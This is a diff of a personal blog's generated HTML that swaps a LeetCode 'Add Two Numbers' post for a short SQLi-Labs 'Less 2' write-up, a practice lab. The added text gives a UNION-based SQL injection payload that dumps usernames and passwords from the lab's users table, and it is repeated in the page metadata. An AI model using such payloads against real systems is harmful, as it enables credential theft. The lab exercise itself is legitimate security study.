@@ -118,7 +118,7 @@
 
 
 
-  <meta name="keywords" content="Algorithm,Leetcode," />
+  <meta name="keywords" content="SQL Injection,SQLi Labs," />
 
 
 
@@ -129,18 +129,18 @@
 
 
 
-<meta name="description" content="You are given two non-empty linked lists representing two non-negative integers. The digits are stored in reverse order and each of their nodes contain a single digit. Add the two numbers and return">
-<meta name="keywords" content="Algorithm,Leetcode">
+<meta name="description" content="less 2 is a little different from less 1. It use a numeric id value instead of a single quotes id value so change payload to ?id=-1 union select 1,group_concat(username, &amp;#39;:&amp;#39;),group_concat(pas">
+<meta name="keywords" content="SQL Injection,SQLi Labs">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Add Two Numbers">
-<meta property="og:url" content="https://busydebug.github.io/2017/12/12/Add-Two-Numbers/index.html">
+<meta property="og:title" content="Less 2">
+<meta property="og:url" content="https://busydebug.github.io/2017/12/12/Less-2/index.html">
 <meta property="og:site_name" content="busydebug">
-<meta property="og:description" content="You are given two non-empty linked lists representing two non-negative integers. The digits are stored in reverse order and each of their nodes contain a single digit. Add the two numbers and return">
+<meta property="og:description" content="less 2 is a little different from less 1. It use a numeric id value instead of a single quotes id value so change payload to ?id=-1 union select 1,group_concat(username, &amp;#39;:&amp;#39;),group_concat(pas">
 <meta property="og:locale" content="en">
-<meta property="og:updated_time" content="2017-12-12T11:10:59.382Z">
+<meta property="og:updated_time" content="2017-12-12T13:41:19.624Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Add Two Numbers">
-<meta name="twitter:description" content="You are given two non-empty linked lists representing two non-negative integers. The digits are stored in reverse order and each of their nodes contain a single digit. Add the two numbers and return">
+<meta name="twitter:title" content="Less 2">
+<meta name="twitter:description" content="less 2 is a little different from less 1. It use a numeric id value instead of a single quotes id value so change payload to ?id=-1 union select 1,group_concat(username, &amp;#39;:&amp;#39;),group_concat(pas">
 
 
 
@@ -170,13 +170,13 @@
 
 
 
-  <link rel="canonical" href="https://busydebug.github.io/2017/12/12/Add-Two-Numbers/"/>
+  <link rel="canonical" href="https://busydebug.github.io/2017/12/12/Less-2/"/>
 
 
 
 
 
-  <title>Add Two Numbers | busydebug</title>
+  <title>Less 2 | busydebug</title>
   
 
 
@@ -303,7 +303,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://busydebug.github.io/2017/12/12/Add-Two-Numbers/">
+    <link itemprop="mainEntityOfPage" href="https://busydebug.github.io/2017/12/12/Less-2/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="busydebug">
@@ -320,7 +320,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">Add Two Numbers</h1>
+          <h1 class="post-title" itemprop="name headline">Less 2</h1>
         
 
         <div class="post-meta">
@@ -332,7 +332,7 @@
               
                 <span class="post-meta-item-text">Posted on</span>
               
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-12-12T19:07:19+08:00">
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-12-12T21:35:58+08:00">
                 2017-12-12
               </time>
             
@@ -355,8 +355,8 @@
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Algorithm/" itemprop="url" rel="index">
-                    <span itemprop="name">Algorithm</span>
+                  <a href="/categories/SQL-Injection/" itemprop="url" rel="index">
+                    <span itemprop="name">SQL Injection</span>
                   </a>
                 </span>
 
@@ -366,8 +366,8 @@
                 
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Algorithm/Leetcode/" itemprop="url" rel="index">
-                    <span itemprop="name">Leetcode</span>
+                  <a href="/categories/SQL-Injection/SQLi-Labs/" itemprop="url" rel="index">
+                    <span itemprop="name">SQLi Labs</span>
                   </a>
                 </span>
 
@@ -403,13 +403,9 @@
       
 
       
-        <blockquote>
-<p>You are given two non-empty linked lists representing two non-negative integers. The digits are stored in reverse order and each of their nodes contain a single digit. Add the two numbers and return it as a linked list.<br>You may assume the two numbers do not contain any leading zero, except the number 0 itself.<br>Example:<br>Input: (2 -&gt; 4 -&gt; 3) + (5 -&gt; 6 -&gt; 4)<br>Output: 7 -&gt; 0 -&gt; 8<br>Explanation: 342 + 465 = 807.</p>
-</blockquote>
-<p><strong>Solution 1</strong><br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode *next;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x) : val(x), next(NULL) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode* <span class="title">addTwoNumbers</span><span class="params">(ListNode* l1, ListNode* l2)</span> </span>&#123;</span><br><span class="line">        ListNode *head = <span class="keyword">new</span> ListNode(<span class="number">0</span>), *p = head;</span><br><span class="line">        <span class="keyword">int</span> carry = <span class="number">0</span>, val1, val2;</span><br><span class="line">        <span class="keyword">while</span> (l1 || l2 || carry) &#123;</span><br><span class="line">            val1 = l1 ? l1-&gt;val : <span class="number">0</span>;</span><br><span class="line">            val2 = l2 ? l2-&gt;val : <span class="number">0</span>;</span><br><span class="line">            </span><br><span class="line">            p-&gt;next = <span class="keyword">new</span> ListNode((val1 + val2 + carry) % <span class="number">10</span>);</span><br><span class="line">            carry = (val1 + val2 + carry) / <span class="number">10</span>;</span><br><span class="line">            </span><br><span class="line">            l1 = l1 ? l1-&gt;next : <span class="literal">NULL</span>;</span><br><span class="line">            l2 = l2 ? l2-&gt;next : <span class="literal">NULL</span>;</span><br><span class="line">            p = p-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> head-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
-<ul>
-<li>time complexity O(max(n, m))</li>
-<li>space complexity O(max(n ,m))</li>
+        <ul>
+<li>less 2 is a little different from less 1. It use a numeric id value instead of a single quotes id value</li>
+<li>so change payload to <code>?id=-1 union select 1,group_concat(username, &#39;:&#39;),group_concat(password, &#39;:&#39;) from security.users %23</code>, then the server will return all username and password</li>
 </ul>
 
       
@@ -428,9 +424,9 @@
       
         <div class="post-tags">
           
-            <a href="/tags/Algorithm/" rel="tag"># Algorithm</a>
+            <a href="/tags/SQL-Injection/" rel="tag"># SQL Injection</a>
           
-            <a href="/tags/Leetcode/" rel="tag"># Leetcode</a>
+            <a href="/tags/SQLi-Labs/" rel="tag"># SQLi Labs</a>
           
         </div>
       
@@ -443,8 +439,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2017/12/11/Less-1/" rel="next" title="Less 1">
-                <i class="fa fa-chevron-left"></i> Less 1
+              <a href="/2017/12/12/Add-Two-Numbers/" rel="next" title="Add Two Numbers">
+                <i class="fa fa-chevron-left"></i> Add Two Numbers
               </a>
             
           </div>
@@ -452,10 +448,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2017/12/12/Less-2/" rel="prev" title="Less 2">
-                Less 2 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
